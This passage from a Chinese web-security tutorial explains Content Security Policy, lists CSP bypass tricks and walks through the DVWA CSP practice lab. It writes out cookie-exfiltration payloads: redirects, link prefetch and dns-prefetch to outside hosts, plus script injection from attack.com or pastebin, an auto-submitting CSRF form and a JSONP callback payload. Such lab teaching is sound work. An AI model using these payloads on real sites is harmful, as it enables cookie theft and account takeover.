&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反向代理，我们就可以通过 <a href="https://links.jianshu.com/go?to=http://www.siam.com/apis/index2.php">www.siam.com/apis/index2.php</a> 这个路径来访问原来部署在<a href="https://links.jianshu.com/go?to=http://www.siam2.com">www.siam2.com</a>下的内容。<br> 这样子就是同源请求了。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>​    CSP全称Content Security Policy ,可以直接翻译为内容安全策略,为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则,指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源），明确告诉客户端，哪些外部资源可以加载和执行。通过CSP协定，让WEB处于一个安全的运行环境中。</p><h4 id="设置方式"><a href="#设置方式" class="headerlink" title="设置方式"></a>设置方式</h4><h5 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content-Security-Policy"></a>Content-Security-Policy</h5><p>一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure><h5 id="lt-meta-gt"><a href="#lt-meta-gt" class="headerlink" title="&lt;meta&gt;"></a>&lt;meta&gt;</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">脚本：只信任当前域名</span><br><span class="line">&lt;object&gt;标签：不信任任何URL，即不加载任何资源</span><br><span class="line">样式表：只信任cdn.example.org和third-party.org</span><br><span class="line">框架（frame）：必须使用HTTPS协议加载</span><br><span class="line">其他资源：没有限制</span><br></pre></td></tr></table></figure><h4 id="策略指令"><a href="#策略指令" class="headerlink" title="策略指令"></a>策略指令</h4><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><h4 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h4><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.<a href="http://foo.com/">foo.com</a></td><td>允许加载<a href="http://foo.com/">foo.com</a>子域的资源</td></tr><tr><td><a href="http://abc.foo.com/">abc.foo.com</a></td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com/">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; steady.foo.com</span><br></pre></td></tr></table></figure><p>默认的内容源必须为同源或者是steady.foo.com</p><h4 id="nonce-script-CSP和strict-dynamic"><a href="#nonce-script-CSP和strict-dynamic" class="headerlink" title="nonce script CSP和strict-dynamic"></a>nonce script CSP和strict-dynamic</h4><h5 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Header(<span class="string">&quot;Content-Security-Policy: script-src &#x27;nonce-&quot;</span>.$random.<span class="string">&quot; &#x27;&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script nonce=<span class="string">&quot;&lt;?php echo $random?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p><h5 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;strict-dynamic&#39;</span><br></pre></td></tr></table></figure><h4 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h4><p>CSP对前端攻击的防御主要有两个：</p><ol><li>限制js的执行。</li><li>限制对不可信域的请求。</li></ol><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><h6 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h6><p>在default-src ‘none‘的情况下，可以使用meta标签实现跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot; &gt;</span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下</p><ul><li><p>用window.location，或者window.open之类的方法进行跳转绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.location&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>&lt;a&gt;标签配合站内的某些可控JS点击操作来跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  $(#foo).click()</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a id&#x3D;&quot;foo&quot; href&#x3D;&quot;xxxxx.com&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>利用网站本身的跳转接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo.com&#x2F;jmp.php?url&#x3D;attack.com</span><br></pre></td></tr></table></figure></li></ul><h6 id="lt-link-gt-标签预加载"><a href="#lt-link-gt-标签预加载" class="headerlink" title="&lt;link&gt;标签预加载"></a>&lt;link&gt;标签预加载</h6><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;[cookie].xxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure><h6 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h6><p>有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</span><br></pre></td></tr></table></figure><p>插入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="DVWA-CSP靶场"><a href="#DVWA-CSP靶场" class="headerlink" title="DVWA-CSP靶场"></a>DVWA-CSP靶场</h1><h4 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;myscripts.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>src 属性规定外部脚本文件的 URL。</p><p>有时，我们需要在网站的多个页面中运行 JavaScript。不需要重复编写相同的脚本，只需在单独的文件中创建 JavaScript，并以 .js 为后缀保存，然后使用&lt;script&gt; 标签中的 src 属性引用该文件即可。</p><p><strong>注释：</strong>外部文件不能包含 &lt;script&gt; 标签！</p><h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><p>源码分析</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//定义script脚本执行策略，可以看到只允许本域、以及一下网站</span></span><br><span class="line">https:<span class="comment">//pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span></span><br><span class="line"><span class="comment">//设置CSP头</span></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"># These might work if you can&#x27;t create your own for some reason</span><br><span class="line"># https://pastebin.com/raw/R570EE00</span><br><span class="line"># https://hastebin.com/raw/ohulaquzex</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//接受include参数</span></span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="comment">//拼接参数</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;script src=&#x27;&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;jWN8HLKe</span><br></pre></td></tr></table></figure><p><code>https://pastebin.com</code>是一个快速文本分享网站，我们可以插入我们的xss代码。</p><p>配合CSRF，诱惑用户自动触发漏洞。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;csp&quot;</span> name=<span class="string">&quot;csp&quot;</span> method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;http://192.168.1.200/DVWA-master/vulnerabilities/csp/&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;input size=<span class="string">&quot;50&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;include&quot;</span> value=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;include&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> cspb = <span class="built_in">document</span>.getElementById(<span class="string">&quot;csp&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  cspb[<span class="number">0</span>].value=<span class="string">&quot;https://pastebin.com/raw/rcBeKDgL&quot;</span>;</span><br><span class="line"> </span><br><span class="line">  cspb.submit();</span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h4 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h4><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//js脚本只允许本域、允许使用内联资源、而且设置了nonce属性</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p>构造payload</p><p>可以加载本地的script并且需要nonce值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="High"><a href="#High" class="headerlink" title="High"></a>High</h4><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//只能加载本地的script</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析<code>../..//vulnerabilities/csp/source/jsonp.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: application&#x2F;json; charset&#x3D;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">if (array_key_exists (&quot;callback&quot;, $_GET)) &#123;</span><br><span class="line">$callback &#x3D; $_GET[&#39;callback&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp &#x3D; array (&quot;answer&quot; &#x3D;&gt; &quot;15&quot;);</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>high.js文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建&lt;script&gt;标签，并添加src属性source/jsonp.php?callback=solveSum，其中solveSum是一个函数，用来添加anser的值。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加代码之后，会将answer的值打印出来，这里如果我们将callback的值修改为文本的值也会打印出来。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"><span class="comment">//点击按钮之后会触发clickButton函数，该函数会添加前端代码。</span></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clickButton();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201006171328103.png" alt="image-20201006171328103"></p><p>构造payload–直接赋予callback值payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&#x3D;&lt;script src&#x3D;source&#x2F;jsonp.php?callback&#x3D;alert(document.cookie)&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Impossible.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加script代码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.src = <span class="string">&quot;source/jsonp_impossible.php&quot;</span>;</span><br><span class="line">    <span 